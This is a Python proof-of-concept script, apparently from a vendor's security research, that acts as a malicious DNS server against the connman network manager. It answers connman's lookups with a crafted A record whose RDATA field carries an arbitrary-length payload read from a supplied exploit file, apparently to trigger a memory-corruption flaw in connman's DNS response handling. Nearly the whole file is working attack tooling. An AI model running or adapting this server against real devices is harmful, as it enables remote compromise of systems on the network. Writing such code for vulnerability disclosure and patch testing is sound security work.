#!/usr/bin/python3
# vim: ts=4 et sw=4 sts=4 :

import argparse
import socket
import struct
import sys

# Matthias Gerstner
# SUSE Linux GmbH
# matthias.gerstner@suse.com


CLASS_IN = 1  # Internet class
RR_TYPE_A = 1  # IPv4 address type


class OutMessage:

    def __init__(self):
        self.clear()

    def clear(self):
        self.m_msg = bytes()

    @classmethod
    def getUint32(cls, num):
        return struct.pack(">I", num)

    def addUint32(self, num):
        self.m_msg += self.getUint32(num)

    def prependUint32(self, num):
        self.m_msg = self.getUint32(num) + self.m_msg

    def addInt32(self, num):
        self.m_msg += struct.pack(">i", num)

    def addUint16(self, num):
        self.m_msg += struct.pack(">H", num)

    def addInt16(self, num):
        self.m_msg += struct.pack(">h", num)

    # TLS uses 24-bit "uint24" record length fields not natively supported
    # by the Python struct module
    def addUint24(self, num):
        raw = self.getUint32(num)
        self.m_msg += raw[1:4]

    def addUint8(self, num):
        self.m_msg += bytes([num])

    def addInt8(self, num):
        self.m_msg += bytes([num])

    def addLabel(self, s):
        self.addUint8(len(s))
        self.addRaw(s.encode())

    def addRaw(self, bts):
        self.m_msg += bts

    def sendMessage(self, sock):
        sock.send(self.m_msg)


class InMessage:

    def __init__(self, msg):
        self.reset()
        self.m_msg = msg
        self.m_msg_len = len(msg)

    def reset(self):
        self.m_msg = bytes()
        self.m_msg_len = 0
        self.m_pos = 0

    def parseUint32(self):
        data = self.getNextBytes(4)
        return struct.unpack(">I", data)[0]

    def parseInt16(self):
        data = self.getNextBytes(2)
        return struct.unpack(">h", data)[0]

    def parseUint16(self):
        data = self.getNextBytes(2)
        return struct.unpack(">H", data)[0]

    def parseUint8(self):
        data = self.getNextBytes(1)
        return data[0]

    def length(self):
        return len(self.m_msg)

    def remainingBytes(self):
        return self.length() - self.m_pos

    def getNextBytes(self, num):
        assert self.remainingBytes() >= num
        data = self.m_msg[self.m_pos:self.m_pos + num]
        self.m_pos += num
        return data

    def skipBytes(self, num):
        assert self.remainingBytes() >= num
        self.m_pos += num


class ConnExec:

    def __init__(self):
        self.m_parser = argparse.ArgumentParser()
        self.m_parser.add_argument("-l", "--listen")
        self.m_parser.add_argument("-p", "--port", default=53, type=int)
        self.m_parser.add_argument("-x", "--exploit", default=None)

        self.m_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def run(self):
        self.m_args = self.m_parser.parse_args()

        if self.m_args.exploit:
            with open(self.m_args.exploit, 'rb') as f:
                self.m_exploit = f.read()
            if len(self.m_exploit) > (2**16) - 1:
                print("Exploit length is too big!")
                sys.exit(1)
        else:
            self.m_exploit = None
        self.m_sock.bind((self.m_args.listen, self.m_args.port))

        while True:
            sys.stdout.flush()
            packet, peer = self.m_sock.recvfrom(1024)
            print("Received", len(packet), "bytes from", peer)

            domain_parts = self.parseReq(packet)

            if len(domain_parts) < 2:
                # connman sends two requests, one with the original (short)
                # hostname, one with the appended domain. Ignore the sort
                # request.
                continue

            print("Sending back reply")
            reply = self.fixupPacket(InMessage(packet), domain_parts)
            self.parseReq(reply)

            self.m_sock.sendto(reply, peer)

    def fixupPacket(self, req, domain_parts):

        reply = OutMessage()
        # copy ID
        reply.addRaw(req.getNextBytes(2))
        # copy flag fields, set the first bit (query response)
        flags = req.parseUint16()
        flags |= (1 << 15)
        reply.addUint16(flags)
        # copy question count
        reply.addRaw(req.getNextBytes(2))
        # add answer count of 1
        reply.addUint16(1)
        req.skipBytes(2)
        # add the rest of the original request
        reply.addRaw(req.getNextBytes(req.remainingBytes()))

        # now add the answer record
        reply.addLabel(domain_parts[0])  # connman expects the answer to its query here
        reply.addLabel("")  # root label termination
        reply.addUint16(RR_TYPE_A)
        reply.addUint16(CLASS_IN)
        reply.addUint32(0)  # TTL

        if self.m_exploit:
            reply.addUint16(len(self.m_exploit))
            reply.addRaw(self.m_exploit)
        else:
            # add a regular IPv4 reply
            reply.addUint16(4)  # length of RDATA
            reply.addUint32(0xFFFFFFFF)   # 255.255.255.255

        return reply.m_msg

    def parseReq(self, packet):
        domain_parts = []
        msg = InMessage(packet)
        id = msg.parseUint16()
        flags = msg.parseUint16()

        print("ID =", id)
        print("Flags =", hex(flags))
        if flags & 0x8000:
            print("type: response")
        else:
            print("type: query")
        opcode = (flags & 0x1e) >> 1
        if opcode == 0:
            print("standard query")
        elif opcode == 1:
            print("iquery")
        elif opcode == 2:
            print("status request")
        else:
            print("unknown opcode")

        aa = flags & 0x20
        print("authoritative:", aa)

        counts = {}

        for label in ("QD", "AN", "NS", "AR"):
            count = msg.parseUint16()
            counts[label] = count
            print(f"{label}count:", count)

        for nr in range(counts["QD"]):
            print("QD record", nr)
            length = 1
            while length != 0:
                length = msg.parseUint8()
                print("Qname length:", length)
                name = msg.getNextBytes(length)
                if length:
                    name = name.decode()
                    print("Qname:", name)
                    domain_parts.append(name)

            qtype = msg.parseUint16()
            qclass = msg.parseUint16()

            print("QType:", qtype)
            print("QClass:", qclass)

        for nr in range(counts["AN"]):
            print("AN record", nr)
            length = 1
            while length != 0:
                length = msg.parseUint8()
                print("Name length:", length)
                name = msg.getNextBytes(length)
                if length:
                    name = name.decode()
                    print("Name:", name)

            an_type = msg.parseUint16()
            an_class = msg.parseUint16()
            ttl = msg.parseUint32()
            rdlength = msg.parseUint16()

            print("ANType:", an_type)
            print("ANClass:", an_class)
            print("TTL:", ttl)
            print("RDLength:", rdlength)

        print("Bytes left:", msg.remainingBytes())

        print("\n\n")
        return domain_parts


if __name__ == '__main__':
    conn_exec = ConnExec()
    conn_exec.run()
